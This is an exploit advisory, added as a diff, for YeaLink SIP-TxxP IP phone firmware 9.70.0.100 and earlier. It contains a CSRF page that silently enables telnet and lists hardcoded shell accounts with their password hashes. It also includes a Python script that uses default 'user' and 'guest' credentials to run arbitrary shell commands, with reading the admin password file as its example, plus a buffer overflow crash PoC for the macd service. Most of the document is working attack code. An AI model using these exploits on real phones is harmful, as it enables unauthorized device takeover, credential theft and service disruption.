@@ -1,0 +1,147 @@
+#+--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title     : YeaLink IP Phone SIP-TxxP firmware <=9.70.0.100 Multiple Vulnerabilities
+# Date              : 12-21-2012
+# Author            : xistence (xistence<[AT]>0x90.nl)
+# Software link     : http://yealink.com/SupportDownloadfiles_detail.aspx?ProductsID=64&CateID=187&flag=142
+# Vendor site       : http://yealink.com
+# Version           : 9.70.0.100 and lower
+# Tested on         : YeaLink IP Phone SIP-T20P (hardware VoIP phone)
+#
+# Vulnerability     : Multiple Vulnerabilities as described below
+#
+#+--------------------------------------------------------------------------------------------------------------------------------+
+
+[0x01] - Hidden page to enable telnet + CSRF
+
+The hidden page http://<IP>/cgi-bin/ConfigManApp.com?Id=10 contains an option to enable Telnet on the phone. Only the "admin" user can access this page.
+However the unprivileged user "user" can post directly to ConfigManApp.com and enable Telnet. This default user "user" has the password "user" and is unlikely to be changed by a user.
+
+Also CSRF to enable this is possible:
+
+<html>
+<head>
+<title>Enable Telnet</title> </head>
+<body>
+<form name="csrf" action="http://<IP>/cgi-bin/ConfigManApp.com" method="post"> 
+<input type="hidden" name="PAGEID" value="10"/>
+<input type="hidden" name="CONFIG_DATA" value="1%261%261%261%260%261%261%260%261%261%260%26%260%260%260%260%260%261%261%260%260"/>
+</form>
+<script> document.csrf.submit(); </script>
+</body>
+</html>
+
+
+[0x02] - Default telnet shell users + passwords
+
+The shell users are hardcoded in the firmware images and are always the same and can't be changed through the webinterface. So after enabling telnet through the hidden page shell access could go unnoticed.
+
+/etc/passwd:
+root:x:0:0:Root,,,:/:/bin/sh
+admin:x:500:500:Admin,,,:/:/bin/sh
+guest:x:501:501:Guest,,,:/:/bin/sh
+
+/etc/shadow:
+root:$1$IJZx7biF$BgyHlA/AgR27VSEBALpqn1:11876:0:99999:7:::
+admin:$1$Bwt9zCNI$7rGLYt.wk.axE.6FUNFZe.:11876:0:99999:7:::
+guest:$1$A3lIJ0aO$Is8Ym.J/mpNejleongGft.:11876:0:99999:7::: <- password is "guest"
+
+/etc/group:
+root:x:0:admin,root
+guest:x:1:guest
+
+The file "/tmp/.htpasswd" is world readable and contains the "admin" password for the web interface.
+
+
+[0x03] - Exploit
+
+The following exploit logs in with the unprivileged user "user" and password "user" in the web interface. Here it enables telnet, logs in with the default user "guest" and password "guest" and executes the shell command specified.
+An example is to do a "cat /tmp/.htpasswd" to retrieve the admin password for the web interface.
+
+
+#!/usr/bin/python
+
+import urllib, urllib2, getpass, sys, telnetlib
+
+print ""
+print "[*] YeaLink IP Phone SIP-TxxP firmware <=9.70.0.100 hidden page telnet enabler + default guest shell account command execution - xistence (xistence<[at]>0x90.nl) - 2012-12-21"
+print ""
+if (len(sys.argv) != 3):
+    print "[*] Usage: " + sys.argv[0] + " <IP of Phone> <command to execute>"
+    print "[*] i.e.:" + sys.argv[0] + " 127.0.0.1 \"cat /tmp/.htpasswd\""
+    print ""
+    exit(0)
+
+phoneIP = sys.argv[1]
+shellCmd = sys.argv[2]
+
+phoneUrl = 'http://%s/cgi-bin/ConfigManApp.com' % phoneIP
+webUser = 'user'
+webPass = 'user'
+telnetUser = 'guest'
+telnetPass = 'guest'
+
+passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
+passman.add_password(None, phoneUrl, webUser, webPass)
+authhandler = urllib2.HTTPBasicAuthHandler(passman)
+opener = urllib2.build_opener(authhandler)
+urllib2.install_opener(opener)
+post_params = urllib.urlencode([("PAGEID", "10"), ("CONFIG_DATA", "1%261%261%261%260%261%261%260%261%261%260%26%260%260%260%260%260%261%261%260%260")])
+
+print "[*] Enable telnet on [ %s ] by posting directly to the hidden page with PAGEID=10 parameter as unprivileged user [ user ]" % phoneUrl
+pagehandle = urllib2.urlopen(phoneUrl, post_params)
+
+print "[*] Making telnet connection to [ %s ] with default user [ %s ] and password [ %s ]" % ( phoneIP, telnetUser, telnetPass )
+tn = telnetlib.Telnet(phoneIP)
+
+tn.read_until("IPPHONE login: ")
+tn.write(telnetUser + "\n")
+if telnetPass:
+    tn.read_until("Password: ")
+    tn.write(telnetPass + "\n")
+
+tn.read_until("$")
+print "[*] Executing shell command [ %s ]" % shellCmd
+tn.write( shellCmd + '\n' )
+tn.read_until( shellCmd )
+print tn.read_until("$").strip("$ ")
+tn.write("exit\n")
+tn.read_all()
+
+
+[0x04] - Remote "/yealink/bin/macd" buffer overflow crash PoC
+
+The following PoC exploit will crash the "/yealink/bin/macd" process on port "12345"
+
+
+
+#!/usr/bin/python
+ 
+import socket,sys,time,struct
+ 
+if len(sys.argv) < 2:
+     print "[*] YeaLink IP Phone SIP-TxxP firmware <=9.70.0.100 /yealink/bin/macd remote buffer overflow crash PoC - xistence (xistence<[at]>0x90.nl) - 2012-12-21"
+     print "[-] Usage: %s <target addr> " % sys.argv[0]
+      
+     sys.exit(0)
+ 
+target = sys.argv[1]
+ 
+if len(sys.argv) > 2:
+     platform = sys.argv[2]
+ 
+buffer = "\x41"*75 
+ 
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+try:
+    s.connect((target,12345))
+except:
+    print "[-] Connection to "+target+" failed!"
+    sys.exit(0)
+
+print "[*] YeaLink IP Phone SIP-TxxP firmware <=9.70.0.100 /yealink/bin/macd remote buffer overflow crash PoC - xistence (xistence<[at]>0x90.nl) - 2012-12-21"
+print "[*] Sending " + `len(buffer)` + " byte crash"
+ 
+s.send(buffer + "\r\n")
+s.recv(1024)
+
+
